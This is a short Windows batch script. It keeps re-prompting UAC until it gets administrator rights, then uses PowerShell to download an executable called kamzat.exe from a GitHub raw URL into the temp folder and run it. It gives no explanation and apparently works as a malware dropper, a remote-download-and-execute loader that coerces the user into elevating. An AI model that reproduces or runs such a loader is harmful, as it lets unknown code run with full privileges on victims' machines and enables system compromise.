@echo off
setlocal

NET SESSION >nul 2>&1
if %errorlevel% == 0 (
    goto admin_tasks
)

:elevate_uac
powershell -Command "Start-Process '%~f0' -Verb RunAs" >nul 2>&1
if %errorlevel% NEQ 0 (
    timeout /t 3 >nul
    goto elevate_uac
)
exit

:admin_tasks
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe' -OutFile '%TEMP%\kamzat.exe'"
if exist "%TEMP%\kamzat.exe" (
    start "" "%TEMP%\kamzat.exe"
)
exit
